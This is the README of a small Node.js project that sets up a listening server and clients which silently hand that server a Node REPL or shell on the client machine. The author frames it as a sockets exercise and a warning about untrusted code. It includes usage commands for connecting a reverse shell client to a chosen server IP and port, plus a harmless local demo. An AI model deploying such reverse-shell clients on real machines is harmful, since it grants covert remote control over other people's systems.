# Simple Reverse Node REPL and Reverse Shell

## Author
- Carlos Domínguez García

## Questions and Answers
- Why did you did this?

    I wanted to do something with sockets in node. Also this shows how easy is for an attacker to do something dangerous. Anyone can do it, we have to be very careful with untrusted code

- Why specify the host and port as environment variables instead of as program arguments?

    Just because I think the code is cleaner this way, I didn't want unnecessary complexity

## Usage
- **Server**: run an interactively server, it waits for a connection and then allows the user to send commands to the client

    ```bash
        PORT='<Port where the server will listen to connections>' npm run server
    ```

- **Node REPL client**: connects to the server and silently provides the server access to a Node REPL in the client machine
    
    ```bash
        # In the machine with the role of the client
        HOST='<Server IP>' PORT='<Server port>' npm run client:node
    ```

- **_Shell_ client**: connects to the server and silently provides the server execution of shell commands in the client machine

    ```bash
        # In the machine with the role of the client
        HOST='<Server IP>' PORT='<Server port>' npm run client:shell
    ```

## Example (using the local machine as client and server)
- First run the server with 

    ```bash
        PORT='8080' npm run server
    ```

- Then run the client on another terminal tab with 
    
    ```bash
        HOST='localhost' PORT='8080' npm run client:node
    ```

- Now go back to the terminal with the server process and you can interact with the client Node REPL.

    ```node
        > process.arch
        'x64'
        > 2 + 3
        5
        > process.stdout.write('Hello') // Outputs "Hello" in the client process
        true
    ```

- To stop the server you can send a kill signal with `Ctrl+C`